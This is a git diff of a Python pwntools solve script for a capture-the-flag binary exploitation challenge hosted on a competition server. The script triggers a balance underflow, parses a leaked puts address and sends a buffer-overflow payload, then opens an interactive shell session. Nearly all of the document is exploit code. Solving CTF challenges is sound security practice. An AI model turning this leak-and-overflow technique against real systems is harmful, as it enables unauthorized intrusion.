@@ -1,9 +1,11 @@
-import socket, re
+import re
+from pwn import *  # type: ignore
 from time import sleep
 
-URL = "chal.pctf.competitivecyber.club"
-PORT = 4444
-SLEEP_LEN = 1
+context(arch="amd64", os="linux")
+# context.log_level = "DEBUG"
+
+RECV_DELAY = 1
 RECV_SIZE = 32768
 
 
@@ -19,49 +21,42 @@ def parse_steps(fname: str):
         return fc.replace("+", "\n")
 
 
-def connect():
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((URL, PORT))
-
-    return client_socket
+r = remote("chal.pctf.competitivecyber.club", 4444)
 
 
-def send(msg: str):
-    conn.send(msg.encode())
-    sleep(SLEEP_LEN)
-    return conn.recv(RECV_SIZE).decode()
+def recv():
+    sleep(RECV_DELAY)
+    return r.recv(RECV_SIZE).decode()
 
 
-def run_steps(steps: str):
-    steps = parse_steps(steps)
-    return send(steps)
+# get balance to underflow
+tip_spam_txt = parse_steps("1_spam_tips.txt")
+r.send(bytes(tip_spam_txt, "utf-8"))
+recv()
+
+# buy the book
+r.send(b"2\n3\ny\n")
+sleep(RECV_DELAY)
+res = recv()
+
+# get address of puts
+pattern = r"0x[0-9a-f]+"
+puts_addr = re.findall(pattern, res)[0]
+print(f"Address of `puts`: {puts_addr}")
 
 
-try:
-    conn = connect()
+def puts_offset(addr):
+    return hex(int(puts_addr, 16) + int(addr, 16))
 
-    # get balance to underflow
-    run_steps("1_spam_tips.txt")
-    res = send("2\n3\ny\n")
 
-    # get address of puts
-    pattern = r"0x[0-9a-f]+"
-    puts_addr = re.findall(pattern, res)[0]
-    print(f"Address of `puts`: {puts_addr}")
+r.send(b"1\ny\n")
 
-    def puts_offset(addr):
-        return hex(int(puts_addr, 16) + int(addr, 16))
+# this part has to be done in the script,
+# because it calculates the offset
+r.send(b"a" * 60)
+r.send(b"\n3\n\n")
+print(recv())
 
-    send("1\ny\n")
+r.interactive()
 
-    # this part has to be done in the script,
-    # because it calculates the offset
-    send("a" * 400)
-    print(send("\n3\n\n"))
-    conn.recv(RECV_SIZE).decode()
-
-    # Close the socket
-    conn.close()
-
-except Exception as e:
-    print(f"Error: {e}")
+r.close()
